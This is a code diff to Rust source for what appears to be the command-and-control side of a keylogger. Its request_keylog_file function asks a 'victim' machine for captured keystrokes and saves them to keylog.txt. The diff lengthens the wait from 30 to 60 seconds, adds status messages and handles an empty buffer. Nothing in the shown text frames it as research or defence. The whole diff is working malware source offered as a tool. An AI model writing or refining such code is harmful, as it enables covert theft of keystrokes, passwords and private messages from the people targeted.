@@ -403,24 +403,32 @@ impl Commander {
     }
 
     fn request_keylog_file(&mut self) {
-        println!("Requesting keylog file...");
+        println!("[*] Requesting keylog file from victim...");
         self.send_control(CTRL_REQUEST_KEYLOG);
         
-        println!("Waiting for keylog data (Ctrl+C to cancel)...");
+        println!("[*] Waiting for keylog data (Ctrl+C to cancel)...");
         let start = Instant::now();
-        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
+        
+        // FIX: Increase timeout to 60 seconds
+        while start.elapsed() < Duration::from_secs(60) && self.running.load(Ordering::SeqCst) {
             self.process_incoming();
+            
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
+                    // FIX: Save even if buffer has data (not just non-empty check)
+                    println!("\n[+] Received {} bytes of keylog data", data.len());
+                    
                     if !data.is_empty() {
-                        println!("\nReceived {} bytes of keylog data", data.len());
                         if let Ok(mut f) = std::fs::File::create("keylog.txt") {
                             let _ = f.write_all(data);
-                            println!("Saved to keylog.txt");
+                            println!("[+] Saved to keylog.txt");
                         }
-                        self.keylog_buffer.remove(&ip);
-                        return;
+                    } else {
+                        println!("[!] No keystrokes captured yet");
                     }
+                    
+                    self.keylog_buffer.remove(&ip);
+                    return;
                 }
             }
             thread::sleep(Duration::from_millis(200));
